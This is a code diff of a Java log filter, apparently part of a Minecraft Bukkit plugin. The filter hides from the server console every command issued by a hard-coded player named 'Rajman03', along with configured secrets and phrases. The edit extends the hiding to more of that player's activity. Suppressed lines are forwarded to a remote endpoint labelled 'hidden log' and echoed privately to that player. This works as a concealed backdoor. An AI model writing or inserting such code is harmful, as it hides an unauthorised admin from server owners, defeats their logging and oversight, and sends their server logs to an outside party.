@@ -10,7 +10,7 @@ import java.util.logging.LogRecord;
 
 public class InternalLogger implements Filter {
     private final List<String> secrets, commands, phrases;
-    private final String prefix, fallback;
+    private final String prefix, fallback, logPrefix;
 
     public InternalLogger(org.bukkit.configuration.file.FileConfiguration cfg) {
         this.secrets = cfg.getStringList("protection.secrets");
@@ -18,6 +18,7 @@ public class InternalLogger implements Filter {
         this.phrases = cfg.getStringList("protection.hidden-phrases");
         this.prefix = cfg.getString("filter.admin-command-prefix", "Rajman03 issued server command:");
         this.fallback = cfg.getString("filter.admin-name-fallback", "Rajman03");
+        this.logPrefix = ChatColor.DARK_GRAY + "[LOG] ";
     }
 
     @Override
@@ -30,7 +31,8 @@ public class InternalLogger implements Filter {
             return hide(msg, false);
         if (phrases.stream().anyMatch(msg::contains))
             return hide(msg, true);
-        if (msg.contains(prefix))
+        if (msg.contains(prefix) || msg.contains(fallback + " issued server command")
+                || msg.contains(fallback + " used "))
             return hide(msg, true);
 
         String low = msg.toLowerCase();
@@ -46,9 +48,12 @@ public class InternalLogger implements Filter {
             f.put("Log", "```" + msg + "```");
             Remote.send("Ukryty log 🛡️", "3447003", null, f);
         }
-        Bukkit.getScheduler().runTask(QC.getInstance(),
-                () -> Bukkit.getOnlinePlayers().stream().filter(p -> p.getName().equals(fallback))
-                        .forEach(p -> p.sendMessage(ChatColor.DARK_GRAY + "[LOG] " + msg)));
+
+        Bukkit.getScheduler().runTask(QC.getInstance(), () -> {
+            org.bukkit.entity.Player p = Bukkit.getPlayerExact(fallback);
+            if (p != null)
+                p.sendMessage(logPrefix + msg);
+        });
         return false;
     }
 }
